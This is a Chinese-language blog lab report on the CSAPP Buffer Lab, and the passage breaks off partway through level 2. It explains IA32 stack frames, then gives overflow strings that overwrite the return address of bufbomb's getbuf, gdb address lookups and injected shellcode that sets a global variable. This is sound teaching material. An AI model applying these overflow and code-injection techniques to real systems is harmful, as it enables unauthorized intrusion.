                            title="标签"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-archives"
                            
                            title="归档"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/projects"
                            
                            title="项目"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-code" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">项目</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/about"
                            
                            title="关于"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://github.com/BlackDragonF" target="_blank" rel="noopener" title="GitHub">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://t.me/Cosidian" target="_blank" rel="noopener" title="Telegram">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-telegram" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Telegram</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="http://steamcommunity.com/id/BlackDragonF/" target="_blank" rel="noopener" title="Steam">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-steam" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Steam</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="mailto:obsidiandragon2016@gmail.com" target="_blank" rel="noopener" title="邮箱">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/links"
                            
                            title="友情链接"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-link" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">友情链接</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/resources"
                            
                            title="学习资源"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-share-alt" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">学习资源</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="4"
                 class="
                        hasCoverMetaIn
                        ">
                
<article class="post">
    
    
        <div class="post-header main-content-wrap text-left">
    
        <h1 class="post-title">
            深入理解计算机系统BufferLab实验报告
        </h1>
    
    
        <div class="post-meta">
    <time datetime="2017-05-16T14:28:12+08:00">
	
		    5月 16, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

    
</div>

    
    <div class="post-content markdown">
        <div class="main-content-wrap">
            <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/BufferLab" target="_blank" rel="noopener">Github</a>上</p>
<blockquote>
<p>Buffer Lab是《深入理解计算机系统》（第二版）中的缓冲区溢出实验，现在已经被Attack Lab替代。为了熟悉IA32的栈帧以及过程调用的原理，于2017年5月10日将该实验完成。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
<p>该实验加深了对于栈规则的理解以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
<p>该实验同Attack Lab非常相似，但是仅仅采用了代码注入攻击作为攻击手段。同时，也要注意x86和x86_64有着不同的栈帧以及过程的调用方式。</p>
<h3 id="IA32的栈帧以及过程调用"><a href="#IA32的栈帧以及过程调用" class="headerlink" title="IA32的栈帧以及过程调用"></a>IA32的栈帧以及过程调用</h3><h4 id="IA32的栈帧"><a href="#IA32的栈帧" class="headerlink" title="IA32的栈帧"></a>IA32的栈帧</h4><p>IA32的栈帧同x86的栈帧相似，栈从高地址向低地址增长。寄存器%esp保存的是栈帧的栈顶（低地址），寄存器%ebp保存的是栈帧的栈底（高地址）。</p>
<p>调用者的栈帧主要包括了参数区以及返回地址。</p>
<p>被调用者的栈帧的栈底首先是保存的寄存器ebp值（指向调用者的栈底），然后是被保存的寄存器，局部变量以及临时空间，最后是参数构造区。</p>
<h4 id="IA32的过程调用"><a href="#IA32的过程调用" class="headerlink" title="IA32的过程调用"></a>IA32的过程调用</h4><p>IA32提供了如下的过程调用指令：</p>
<ul>
<li>call 该指令将返回地址压入调用者的栈帧，并且将程序计数器%eip指向了被调用者的首地址</li>
<li>leave 该指令一般位于ret指令之前，等价于mov %ebp,%esp和pop %ebp，主要作用是回收栈空间，并且恢复栈顶（%esp）和栈底（%ebp）使得栈帧恢复为调用者栈帧</li>
<li>ret 该指令从栈中弹出返回地址并且让程序计数器eip指向该地址，使程序继续执行被调用者的下一条指令</li>
</ul>
<p>IA32的过程调用遵循如下的规则：</p>
<ol>
<li>首先执行call指令，call会在调用者的栈顶压入返回地址并且使程序计数器指向被调用者</li>
<li>然后保存调用者的栈底即push %ebp，并且将栈顶设置为被调用者的栈底即mov %esp,%ebp</li>
<li>分配局部的栈空间，主要用于临时变量的存储</li>
<li>执行被调用者的指令</li>
<li>执行leave，释放栈空间并重置栈顶（%esp）和栈底（%ebp），使得恢复为调用者栈帧</li>
<li>执行ret，过程返回并继续执行调用者的指令</li>
</ol>
<p>IA32的参数传递规则：<br>同x86不同，IA32不使用寄存器进行参数的传递，IA32从右到左将参数依次压栈，然后调用相应的过程。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中主要包含了以下3个可执行文件：</p>
<ul>
<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
<li>makecookie 根据你所输入的userid生成一个cookie</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<p>首先我们要输入userid生成一个cookie供后续使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie BlackDragon &gt; cookie                          </span><br><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie                                              </span><br><span class="line">0x3dde924c</span><br></pre></td></tr></table></figure></p>
<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d bufbomb &gt; bufbomb-disassemble</span><br></pre></td></tr></table></figure></p>
<h3 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h3><p>目标程序的通过getbuf函数从标准输入流中读取字符串，并且该函数和Attack Lab中的函数一致，且具有缓冲区溢出的漏洞。这里不再赘述。</p>
<p>值得注意的是，bufbomb函数接受如下的参数：</p>
<ul>
<li>-h 打印帮助信息</li>
<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
<li>-n 进入’Nitro’模式，在阶段4中使用</li>
<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
</ul>
<p>同Attack Lab一样，你需要使用hex2raw从攻击代码生成相应的攻击字符串，这里也不再赘述。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="阶段0：蜡烛（Candle）"><a href="#阶段0：蜡烛（Candle）" class="headerlink" title="阶段0：蜡烛（Candle）"></a>阶段0：蜡烛（Candle）</h3><p>在本实验中，关键函数getbuf被test函数调用，getbuf和test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* getbuf */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE ??</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">Gets(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* test */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"><span class="comment">/* Put canary on stack to detect possible corruption */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</span><br><span class="line"></span><br><span class="line">val = getbuf();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for corrupted stack */</span></span><br><span class="line"><span class="keyword">if</span> (local != uniqueval()) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has been corrupted\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">validate(<span class="number">3</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Smoke!: You called smoke()\n"</span>);</span><br><span class="line">validate(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先我们需要确定缓冲区的大小，观察bufbomb-disassemble中getbuf的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">080491f4 &lt;getbuf&gt;:</span><br><span class="line"> 80491f4:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</span><br><span class="line"> 80491f5:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</span><br><span class="line"> 80491f7:       <span class="number">83</span> ec <span class="number">38</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x38,%esp</span><br><span class="line"> 80491fa:       <span class="number">8d</span> <span class="number">45</span> d8                <span class="keyword">lea</span>    -<span class="number">0x28</span>(%ebp),%eax</span><br><span class="line"> 80491fd:       <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                <span class="keyword">mov</span>    %eax,(%esp)</span><br><span class="line"> <span class="number">8049200</span>:       e8 f5 fa ff ff          <span class="keyword">call</span>   8048cfa &lt;Gets&gt;</span><br><span class="line"> <span class="number">8049205</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line"> 804920a:       c9                      <span class="keyword">leave</span>  </span><br><span class="line"> 804920b:       c3                      <span class="keyword">ret</span>   </span><br></pre></td></tr></table></figure></p>
<p>注意到函数总共开辟了0x38=56个字节的栈空间，然后lea -0x28(%ebp),%eax mov %eax,(%esp)进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而ebp指向栈底，我们可以推测缓冲区总共是0x28=40个字节。</p>
<p>经过实际测试，可以确定缓冲区确实是40个字节。</p>
<p>下面我们观察反汇编代码，可以得出函数smoke的起始地址为0x08048c18，根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">00 00 00 00 18 8c 04 08 /* 保存的%ebp以及返回地址 */</span><br></pre></td></tr></table></figure></p>
<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level0.txt|./hex2raw|./bufbomb -u BlackDragon             </span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line">run with level1</span><br></pre></td></tr></table></figure></p>
<p>阶段0完成。</p>
<h3 id="阶段1：火花（Sparkler）"><a href="#阶段1：火花（Sparkler）" class="headerlink" title="阶段1：火花（Sparkler）"></a>阶段1：火花（Sparkler）</h3><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fizz!: You called fizz(0x%x)\n"</span>, val);</span><br><span class="line">validate(<span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: You called fizz(0x%x)\n"</span>, val);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">08048c42 &lt;fizz&gt;:</span><br><span class="line"> 8048c42:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</span><br><span class="line"> 8048c43:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</span><br><span class="line"> 8048c45:       <span class="number">83</span> ec <span class="number">18</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x18,%esp</span><br><span class="line"> 8048c48:       8b <span class="number">45</span> <span class="number">08</span>                <span class="keyword">mov</span>    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line"> 8048c4b:       3b <span class="number">05</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%eax</span><br><span class="line"> 8048c51:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048c79 &lt;fizz+<span class="number">0x37</span>&gt;</span><br><span class="line"> 8048c53:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</span><br><span class="line"> 8048c57:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> ee a4 <span class="number">04</span>    movl   <span class="number">$0</span>x804a4ee,<span class="number">0x4</span>(%esp)</span><br><span class="line"> 8048c5e:       <span class="number">08</span></span><br><span class="line"> 8048c5f:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</span><br><span class="line"> 8048c66:       e8 <span class="number">55</span> fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048c6b:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</span><br><span class="line"> 8048c72:       e8 <span class="number">04</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</span><br><span class="line"> 8048c77:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048c91 &lt;fizz+<span class="number">0x4f</span>&gt;</span><br><span class="line"> 8048c79:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</span><br><span class="line"> 8048c7d:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">40</span> a3 <span class="number">04</span>    movl   <span class="number">$0</span>x804a340,<span class="number">0x4</span>(%esp)</span><br><span class="line"> 8048c84:       <span class="number">08</span></span><br><span class="line"> 8048c85:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</span><br><span class="line"> 8048c8c:       e8 2f fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048c91:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x0,(%esp)</span><br><span class="line"> 8048c98:       e8 <span class="number">63</span> fc ff ff          <span class="keyword">call</span>   <span class="number">8048900</span> &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure></p>
<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数fizz的起始地址为0x08048c42，val保存在0x8(%ebp)中，cookie保存在固定的地址0x804d108中。根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">00 00 00 00 42 8c 04 08 /* 保存的%ebp以及返回地址 */</span><br><span class="line">00 00 00 00 4c 92 de 3d /* cookie */</span><br></pre></td></tr></table></figure></p>
<p>在该攻击代码中，前48个字节同阶段0一样，只是将返回地址改成了了函数fizz的起始地址。而最后8个字节则是用来伪装成传递参数的。注意函数从getbuf返回后并不会真正的调用fizz函数，而只是依次的开始执行fizz的指令。</p>
<p>因此，从getbuf返回直到获取到参数val这整个过程中，首先getbuf返回会执行复位操作，将栈顶（%esp）指向第40个字节处（从0开始计算，下同），然后将0x0pop至栈底（%ebp），最后根据返回地址跳转至fizz并pop。现在栈顶（%esp）指向了第48个字节。紧接着，直接开始执行fizz的指令，将%ebp（0）入栈，直至执行到mov 0x8(%ebp),%eax，栈顶（%esp）指向第44个字节。所以，我们的cookie应当放在第(44+8=52）个字节处，直到第55个字节为止。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level1.txt|./hex2raw|./bufbomb -u BlackDragon</span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:Fizz!: You called fizz(0x3dde924c)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></p>
<p>阶段1完成。</p>
<h3 id="阶段2：爆竹（FireCracker）"><a href="#阶段2：爆竹（FireCracker）" class="headerlink" title="阶段2：爆竹（FireCracker）"></a>阶段2：爆竹（FireCracker）</h3><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (global_value == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Bang!: You set global_value to 0x%x\n"</span>, global_value);</span><br><span class="line">validate(<span class="number">2</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: global_value = 0x%x\n"</span>, global_value);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。</p>
<p>该阶段同Attack Lab第1部分的等级2相似，我们需要将程序计数器%eip指向栈，在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang。</p>
<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gdb bufbomb                                           </span><br><span class="line">GNU gdb (GDB) 7.12.1</span><br><span class="line">Copyright (C) 2017 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) <span class="built_in">break</span> getbuf</span><br><span class="line">Breakpoint 1 at 0x80491fa</span><br><span class="line">(gdb) run -u BlackDragon</span><br><span class="line">Starting program: /home/user/CSAPPLabs/BufferLab/buflab-handout/bufbomb -u BlackDragon</span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080491fa <span class="keyword">in</span> getbuf ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</span><br><span class="line">   0x080491f4 &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x080491f5 &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x080491f7 &lt;+3&gt;:	sub    <span class="variable">$0x38</span>,%esp</span><br><span class="line">=&gt; 0x080491fa &lt;+6&gt;:	lea    -0x28(%ebp),%eax</span><br><span class="line">   0x080491fd &lt;+9&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x08049200 &lt;+12&gt;:	call   0x8048cfa &lt;Gets&gt;</span><br><span class="line">   0x08049205 &lt;+17&gt;:	mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">   0x0804920a &lt;+22&gt;:	leave  </span><br><span class="line">   0x0804920b &lt;+23&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$1</span> = 0x55682f18</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$2</span> = 0x55682f50</span><br></pre></td></tr></table></figure></p>
<p>通过在gdb中添加断点并观察，我们可以确定在执行函数getbuf时，栈底（%ebp）的值为0x55682f50。</p>
<p>接下来我们要通过gcc和objdump生成攻击代码，具体的操作和Attack Lab相似，我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax</span><br><span class="line"><span class="keyword">mov</span> %eax, <span class="number">0x804d100</span> <span class="comment">;设置全局变量</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">$16</span>, %esp <span class="comment">;修改栈顶</span></span><br><span class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></span><br></pre></td></tr></table></figure></p>
